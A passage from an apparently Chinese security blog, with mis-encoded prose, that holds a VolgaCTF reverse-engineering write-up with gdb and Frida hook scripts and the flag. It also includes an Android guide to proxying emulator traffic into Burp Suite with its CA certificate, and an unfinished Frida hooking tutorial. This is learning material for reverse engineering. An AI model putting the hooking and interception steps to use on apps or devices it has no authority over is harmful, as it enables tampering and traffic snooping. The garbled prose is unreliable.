<figure class="highlight python"><figcaption><span>solve-gdb.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(gdb.parse_and_eval(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">address, size</span>):</span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> inf.read_memory(address, size).tobytes()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">address, buf</span>):</span><br><span class="line">    inf = gdb.inferiors()[<span class="number">0</span>]</span><br><span class="line">    inf.write_memory(address, buf)</span><br><span class="line"></span><br><span class="line">memory = &#123;&#125;</span><br><span class="line">state = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Start</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location</span>):</span><br><span class="line">        <span class="built_in">super</span>(Start, self).__init__(spec = location, <span class="built_in">type</span> = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        state.append((register(<span class="string">&#x27;$rdi&#x27;</span>), register(<span class="string">&#x27;$rsi&#x27;</span>), register(<span class="string">&#x27;$rdx&#x27;</span>), register(<span class="string">&#x27;$rcx&#x27;</span>)))</span><br><span class="line">        <span class="keyword">if</span> memory.get(state[-<span class="number">1</span>][<span class="number">1</span>:]) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            gdb.execute(<span class="string">&#x27;set $rsi = 1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">End</span>(gdb.Breakpoint):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, location</span>):</span><br><span class="line">        <span class="built_in">super</span>(End, self).__init__(spec = location, <span class="built_in">type</span> = gdb.BP_BREAKPOINT, internal = <span class="literal">False</span>, temporary = <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> state</span><br><span class="line">        buf, h = state[-<span class="number">1</span>][<span class="number">0</span>], state[-<span class="number">1</span>][<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> memory.get(h) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            memory[h] = (read(buf, <span class="number">8</span>), read(buf + <span class="number">8</span>, <span class="number">8</span>), read(buf + <span class="number">16</span>, <span class="number">8</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            write(buf, memory[h][<span class="number">0</span>])</span><br><span class="line">            write(buf + <span class="number">8</span>, memory[h][<span class="number">1</span>])</span><br><span class="line">            write(buf + <span class="number">16</span>, memory[h][<span class="number">2</span>])</span><br><span class="line">        state = state[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">Start(<span class="string">f&#x27;*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x13b0</span>&#125;</span>&#x27;</span>)</span><br><span class="line">End(<span class="string">f&#x27;*<span class="subst">&#123;<span class="number">0x0000555555554000</span> + <span class="number">0x1424</span>&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>gdb f-hash</code> ä¹‹å¾Œï¼Œåœ¨ gdb è£¡é¢åŸ·è¡Œ <code>source solve-gdb.py</code> å°±å¯ä»¥è·‘ä¸Šé¢çš„ç¨‹å¼ç¢¼äº†<br>
æˆ–æ˜¯ä¹Ÿå¯ä»¥åœ¨åŸ·è¡Œ gdb çš„æ™‚å€™å°±è¼‰å…¥ <code>gdb -x solve-gdb.py f-hash</code></p>
<h2 id="Frida">Frida</h2>
<p>é€™å€‹æ–¹æ³•ä¹Ÿæ˜¯æˆ‘è³½å¾Œçœ‹ <a target="_blank" rel="noopener" href="https://sectt.github.io/writeups/Volga20/f-hash/README">åˆ¥äºº</a> ç”¨çš„ï¼Œfrida çœŸçš„æ˜¯å¥½æ±è¥¿ï¼Œä¹‹å‰å‰›å¥½æœ‰ç ”ç©¶ä¸€é» fridaï¼Œç¬¬ä¸€æ¬¡ç”¨åœ¨æ¯”è³½ä¸­ï¼ŒåŸºæœ¬ä¸Šè·Ÿå‰ä¸€å€‹è§£æ³•ä¸€æ¨£å» hook å‡½å¼çš„é–‹é ­å’Œçµå°¾ï¼Œä¸é frida åˆæ›´æ–¹ä¾¿äº†ï¼Œè«‹çœ‹ä¸‹é¢ç¨‹å¼ç¢¼ã€‚</p>
<figure class="highlight javascript"><figcaption><span>solve-frida.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base = <span class="title function_">ptr</span>(<span class="title class_">Process</span>.<span class="title function_">enumerateModulesSync</span>()[<span class="number">0</span>].<span class="property">base</span>)</span><br><span class="line"><span class="keyword">var</span> recursive_func_ptr = base.<span class="title function_">add</span>(<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mem = &#123;&#125;</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(recursive_func_ptr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span> = args[<span class="number">0</span>]</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">hash</span> = args[<span class="number">1</span>] + <span class="string">&#x27;-&#x27;</span> + args[<span class="number">2</span>] + <span class="string">&#x27;-&#x27;</span> + args[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="variable language_">this</span>.<span class="property">hash</span>] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            args[<span class="number">1</span>] = <span class="title function_">ptr</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mem[<span class="variable language_">this</span>.<span class="property">hash</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            mem[<span class="variable language_">this</span>.<span class="property">hash</span>] = [<span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">readU64</span>(), <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">8</span>).<span class="title function_">readU64</span>(), <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">16</span>).<span class="title function_">readU64</span>()]</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">0</span>])</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">8</span>).<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">add</span>(<span class="number">16</span>).<span class="title function_">writeU64</span>(mem[<span class="variable language_">this</span>.<span class="property">hash</span>][<span class="number">2</span>])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>æœ€å¾ŒåŸ·è¡Œ <code>frida --no-pause --runtime=v8 -l solve-frida.js ./f-hash</code> å°±å¯ä»¥äº†</p>
<h2 id="Flag">Flag</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VolgaCTF&#123;16011432ba16efc8dcf779477985b3b9&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash">https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash</a></li>
<li><a target="_blank" rel="noopener" href="https://pastebin.com/Dj6wteXk">https://pastebin.com/Dj6wteXk</a></li>
<li><a target="_blank" rel="noopener" href="https://sectt.github.io/writeups/Volga20/f-hash/README">https://sectt.github.io/writeups/Volga20/f-hash/README</a></li>
</ol>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/05/04/f-hash/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-03-17T16:00:00.000Z" title="3/18/2020, 12:00:00 AM">2020-03-18</time></span><i class="material-icons">schedule</i><span class="level-item">5 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a><span>Â /Â </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/reverse/">reverse</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/03/18/android-proxy/">ã€å®‰å“é€†å‘ã€‘é€é Burp Suite Proxy å¤œç¥æ¨¡æ“¬å™¨</a></h1><div class="content"><h2 id="å‰è¨€">å‰è¨€</h2>
<p>åœ¨ä¸Šä¸€ç¯‡ adb çš„ç’°å¢ƒä½ˆç½®ä¸­ï¼Œæˆ‘å€‘æ˜¯ç”¨ Android Emulatorï¼Œä½†æˆ‘æƒ³è¦ reverse çš„ app åªæœ‰æ”¯æ´ arm ( è »å¤š app éƒ½æ²’æœ‰æ”¯æ´ x86-64 çš„ )ï¼Œè€Œåœ¨æˆ‘ x86-64 æ©Ÿå™¨ä¸Šçš„ Android Emulator ä¸Šé–‹ arm çš„è™›æ“¬æ©Ÿå¾ˆæ…¢ï¼Œæ‰€ä»¥æˆ‘å°±æ›ç”¨äº† Nox Playerï¼Œä»–åŒæ™‚æ”¯æ´ arm è·Ÿ x86-64 çš„æ¶æ§‹ï¼Œé€Ÿåº¦ä¹ŸæŒºå¿«çš„ã€‚</p>
<p>æ©ç­‰ç­‰ï¼Œæˆ‘å‰›å‰›æ‰ç™¼ç¾åŸä¾† Nox Player æ˜¯åœ¨ VirtualBox ä¸Šé¢é–‹ä¸€å°è™›æ“¬æ©Ÿè·‘ï¼Œå‚»çœ¼ã€‚</p>
<details class="admonition question" open><summary>æ€éº¼çŸ¥é“é€™å€‹ app æ”¯æ´ä»€éº¼</summary><p><p>ç”¨ apktool è§£é–‹ apk æª”å¾Œï¼Œçœ‹ <code>/lib</code> è³‡æ–™å¤¾ä¸‹é¢æœ‰å“ªäº›è³‡æ–™å¤¾ï¼Œå¯èƒ½æœƒæœ‰ <code>arm64-v8a</code>ã€<code>armeabi-v7a</code>ã€<code>x86</code>ã€<code>x86_64</code> ç­‰ï¼Œé€™äº›å°±æ˜¯é€™å€‹ app ç”¨åˆ°çš„å‡½å¼åº«ï¼Œæ²’æœ‰å°æ‡‰æ¶æ§‹çš„å‡½å¼åº«ç•¶ç„¶å°±æ˜¯ä¸æ”¯æ´äº†ï¼Œæˆ–è€…æœ‰äº› app æœƒå°‡æ¯å€‹æ¶æ§‹åˆ†é–‹ç™¼ä½ˆï¼Œåªè¦å»ä¸‹è¼‰å°æ‡‰æ¶æ§‹çš„ app å°±å¯ä»¥äº†ã€‚</p>
</p></details>
<details class="admonition question" open><summary>adb æ€éº¼é€£ä¸Šå¤œç¥æ¨¡æ“¬å™¨</summary><p><p>å¤œç¥æ¨¡æ“¬å™¨é è¨­æœƒæŠŠ adb server é–‹åœ¨ port 62001, 62025, 62026, â€¦ ( æˆ‘ä¸çŸ¥é“ç‚ºä»€éº½ 62001 ç›´æ¥è·³åˆ° 62025 )<br>
æ‰€ä»¥ <code>adb connect localhost:62001</code> å°±å¯ä»¥å•¦</p>
</p></details>
<h2 id="Drony"><a target="_blank" rel="noopener" href="https://apkpure.com/tw/drony/org.sandroproxy.drony">Drony</a></h2>
<p>ä¸»è¦æ˜¯åƒè€ƒé€™ç¯‡ <a target="_blank" rel="noopener" href="https://king-sabri.net/android-hacking-setup-global-proxy-for-all-apps-in-android-without-root-with-burp-suite/">Android Hacking | Setup Global Proxy for All Apps in Android (without root) with Burp Suite<br>
</a> çš„æ•™å­¸ï¼Œåœ¨ä½¿ç”¨ Drony å‰ï¼Œæˆ‘é‚„æœ‰ç”¨éå¦ä¸€æ¬¾å« ProxyDroidï¼Œä¸éæ²’æˆåŠŸï¼Œä¸çŸ¥é“å‡ºäº†ä»€éº¼äº‹ã€‚</p>
<p>åŸºæœ¬æµç¨‹æ˜¯é€™æ¨£çš„ï¼Œå› ç‚º Drony æœ¬èº«ä¹Ÿæ˜¯ä¸€å€‹ proxy serverï¼Œæ‰€ä»¥è¦å…ˆåœ¨ Android çš„è¨­å®šä¸­å°‡ proxy å°å‘åˆ° Dronyï¼Œç„¶å¾Œåœ¨ Drony çš„è¨­å®šä¸­å°‡ proxy å°å‘ä¸»æ©Ÿçš„ Burp Suiteã€‚</p>
<h3 id="ç¬¬ä¸€æ­¥">ç¬¬ä¸€æ­¥</h3>
<p>æ‰“é–‹ Android çš„è¨­å®šï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é»<br>
è¨­å®š &gt; ç„¡é™èˆ‡ç¶²è·¯ &gt; Wi-Fi &gt; ä½ çš„ Wi-FI çš„åå­— ( é•·æŒ‰ä»– ) &gt; ä¿®æ”¹ç¶²è·¯ &gt; é¡¯ç¤ºé€²éšé¸é … &gt; Proxy ( æ‰‹å‹• )<br>
ä¸»æ©Ÿåç¨±å¡« 127.0.0.1ï¼Œé€šè¨ŠåŸ å¡« 8020 ( Drony é è¨­çš„é€šè¨ŠåŸ  )</p>
<h3 id="ç¬¬äºŒæ­¥">ç¬¬äºŒæ­¥</h3>
<p>æ‰“é–‹ Drony çš„è¨­ç½®ï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é»<br>
è¨­ç½® &gt; ç¶²è·¯ &gt; ç„¡ç·šç¶²è·¯ &gt; ä½ çš„ Wi-FI çš„åå­—<br>
ä»£ç†é¡å‹é¸æ‰‹å†Š ( ä¹Ÿå°±æ˜¯ Manualï¼ŒçœŸçˆ›çš„ç¿»è­¯ )ï¼Œä¸»æ©Ÿåç¨±å¡«ä¸»æ©Ÿçš„ ipï¼Œé€šè¨ŠåŸ å¡« 8080 ( Burp Suite é è¨­çš„é€šè¨ŠåŸ  )</p>
<details class="admonition question" open><summary>æ€éº¼æ‰¾ä¸»æ©Ÿçš„ ip</summary><p><p>ä¸»æ©ŸåŸºæœ¬ä¸Šæœƒæ˜¯ Nox Player çš„ default gateway ( å…¶å¯¦å°±æ˜¯åœ¨ VirtualBox çš„ NAT Mode )ï¼Œæ‰€ä»¥ä¸‹ <code>adb shell ip route show</code> æ‰¾åˆ° default gateway å°±æ˜¯ä¸»æ©Ÿçš„ ip äº†</p>
</p></details>
<h3 id="å®Œæˆ">å®Œæˆ</h3>
<p>é€™æ¨£å°±è¨­å®šå¥½å•¦ï¼Œåœ¨æ—¥èªŒé é¢æŠŠé–‹é—œæ‰“é–‹å°±å¯ä»¥äº†ã€‚</p>
<h2 id="Burp-Suite-æ†‘è­‰å®‰è£">Burp Suite æ†‘è­‰å®‰è£</h2>
<p>é †ä¾¿å®‰è£ä¸€ä¸‹ Burp Suite çš„æ†‘è­‰ï¼Œé€™æ¨£å°±ä¸æœƒä¸€ç›´è·³æ†‘è­‰å•é¡Œäº†<br>
å…ˆåˆ° <a target="_blank" rel="noopener" href="http://burp">http://burp</a> ä¸‹è¼‰ Burp Suite çš„æ†‘è­‰ï¼Œè¼‰ä¸‹ä¾†æ˜¯ der å‰¯æª”åçš„è©±ï¼Œå…ˆæŠŠä»–æ”¹åæˆ cer å‰¯æª”åçµå°¾<br>
æ‰“é–‹ Android çš„è¨­å®šï¼Œç…§è‘—ä¸‹é¢é€™æ¨£é»<br>
è¨­å®š &gt; å€‹äºº &gt; å®‰å…¨æ€§ &gt; æ†‘è­‰å„²å­˜ç©ºé–“ &gt; å¾ SD å¡å®‰è£ ( é¸ cacert.cer )<br>
å®‰è£çš„æ™‚å€™ä»–æœƒå«ä½ è¨­å®šä¸€ä¸‹ PIN ç¢¼</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/03/18/android-proxy/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-02-21T16:00:00.000Z" title="2/22/2020, 12:00:00 AM">2020-02-22</time></span><i class="material-icons">schedule</i><span class="level-item">2 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">ç¨‹å¼</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/22/blog02/">ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x02</a></h1><div class="content"><h2 id="Admonition">Admonition</h2>
<p>æˆ‘æŠŠ <a target="_blank" rel="noopener" href="https://squidfunk.github.io/mkdocs-material/extensions/admonition/">Material for MkDocs - Admonition Extension</a> æ¬éä¾†å•¦ï¼Œå› ç‚ºå¯¦åœ¨å¤ªå¥½çœ‹ï¼Œå°±æ¬éä¾†ç”¨äº†ï¼Œä¸¦ä¸”åšäº†ä¸‹é¢å…©å€‹å°æ”¹å‹•</p>
<ol>
<li>æŠŠ <code>border-radius</code> æ‹”æ‰äº†ï¼Œé‚„æ˜¯æ–¹çš„å¥½çœ‹</li>
<li>é™°å½±æ”¹æ·¡äº†ï¼Œæ„Ÿè¦ºæ¯”è¼ƒå°</li>
</ol>
<details class="admonition example" open><summary>example</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition note" open><summary>note</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition abstract" open><summary>abstract</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition info" open><summary>info</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition tip" open><summary>tip</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition success" open><summary>success</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition question" open><summary>question</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition warning" open><summary>warning</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition failure" open><summary>failure</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition danger" open><summary>danger</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<details class="admonition quote" open><summary>quote</summary><p><p>é€™æ˜¯ç¯„ä¾‹</p>
</p></details>
<h3 id="å¯¦ä½œ">å¯¦ä½œ</h3>
<p>å¾ <a target="_blank" rel="noopener" href="https://github.com/haishanh/hexo-tag-admonition">hexo-tag-admonition</a> å€Ÿ code éä¾†æ”¹<br>
åŸºæœ¬ä¸Šå°±æ˜¯ register ä¸€å€‹æ–°çš„ hexo tagï¼Œç„¶å¾Œç”¨åˆ°äº† <code>details</code> å’Œ <code>summary</code> é€™å…©å€‹ html5 æ–°çš„ tag<br>
æ”¹çš„æ™‚å€™æœ‰å¹¾å€‹å°åœ°æ–¹è¦æ³¨æ„</p>
<ol>
<li><code>details</code> tag åŸæœ¬å°±æœ‰ä¸€å€‹ç®­é ­ä½†æ˜¯å¾ˆé†œï¼Œåœ¨ <code>summary::-webkit-details-marker</code> è¨­å®š <code>display:none</code> æ‹”æ‰ä»–</li>
<li>icon ç”¨åˆ°äº† <code>font-family: Material Icons</code>ï¼Œè¦åœ¨ <code>head</code> è£¡é¢åŠ å€‹å­—é«”</li>
</ol>
<h2 id="Code-block">Code block</h2>
<p>å¦ä¸€å€‹æ”¹å‹•æ˜¯ç¨‹å¼ç¢¼å€å¡Šçš„éƒ¨åˆ†ï¼ŒåŸä¾†çš„æœ‰é»å°é†œï¼Œå°±æ”¹äº†å¹¾ä¸‹</p>
<ol>
<li>æ²’æœ‰çµ¦æª”åå°±ä¸è¦é¡¯ç¤ºä¸Šé¢çš„ header</li>
<li>å¯ä»¥æŒ‡å®šèµ·å§‹è¡Œæ•¸ï¼Œä»¥åŠæŒ‡å®šæ¨™è¨˜ç‰¹å®šè¡Œæ•¸ï¼Œå¦‚ä¸‹ç¯„ä¾‹</li>
</ol>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python run.py &gt;3,6</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>run.py >3,6</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test <span class="subst">&#123;math.factorial(<span class="number">5</span>)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/02/22/blog02/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-02-15T16:00:00.000Z" title="2/16/2020, 12:00:00 AM">2020-02-16</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a><span>Â /Â </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/reverse/">reverse</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/02/16/frida/">ã€å®‰å“é€†å‘ã€‘Frida Hook å‹•æ…‹èª¿è©¦</a></h1><div class="content"><p>ä»Šå¤©æˆ‘å€‘è¦ä¾†ç·´ç¿’ç”¨ frida åœ¨ Android ä¸Šåšå‹•æ…‹èª¿è©¦</p>
<h2 id="é€†ä¹‹å‘¼å¸å£¹ä¹‹å‹-ä¸€èˆ¬å‡½å¼">é€†ä¹‹å‘¼å¸å£¹ä¹‹å‹ - ä¸€èˆ¬å‡½å¼</h2>
<p>å…ˆä¾†å¯«å€‹ç°¡å–®çš„ç¯„ä¾‹ APP<br>
æœ‰ä¸€å€‹æŒ‰æ‰­å’Œä¸€å€‹è¼¸å…¥æ¬„ï¼Œè¼¸å…¥åå­—ä¹‹å¾Œï¼ŒæŒ‰ä¸‹æŒ‰éˆ•ï¼Œå°±æœƒé¡¯ç¤º Hello åŠ ä¸Šä½ è¼¸å…¥çš„åå­—<br>
ä¸æœƒå¯« APP çš„å°æœ‹å‹å¯ä»¥å…ˆå» youtube ä¸Šæ‰¾æ•™å­¸ï¼Œæœ‰ä¸€å¤§å †</p>
<figure class="highlight java"><figcaption><span>MainActivity.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">sayButton</span> <span class="operator">=</span> findViewById(R.id.sayButton);</span><br><span class="line">        sayButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">EditText</span> <span class="variable">somethingEditText</span> <span class="operator">=</span> findViewById(R.id.somethingEditText);</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">resultTextView</span> <span class="operator">=</span> findViewById(R.id.resultTextView);</span><br><span class="line">                <span class="type">String</span> <span class="variable">something</span> <span class="operator">=</span> somethingEditText.getText().toString();</span><br><span class="line">                resultTextView.setText(say(something));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span> <span class="params">(String something)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + something;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p align="center"><img data-src="/images/example-app.png" class=" lazyload"  width="300" title="example app"></p>
<p>python è² è²¬å‘¼å« frida api åšæ³¨å…¥ï¼Œjavascript æ˜¯è¢«æ³¨å…¥é€²å»åšäº‹çš„<br>
æˆ‘å€‘çš„ç›®æ¨™æ˜¯ hook å‡½å¼ <code>say</code>ï¼Œä¸¦åœ¨åŸæœ¬çš„è¼¸å‡ºæ–‡å­—å¾Œé¢åŠ ä¸Š <code>!!!</code></p>
<figure class="highlight python"><figcaption><span>hook.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.example.myapplication&quot;</span>])</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;script.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">    script.on(<span class="string">&quot;message&quot;</span>, 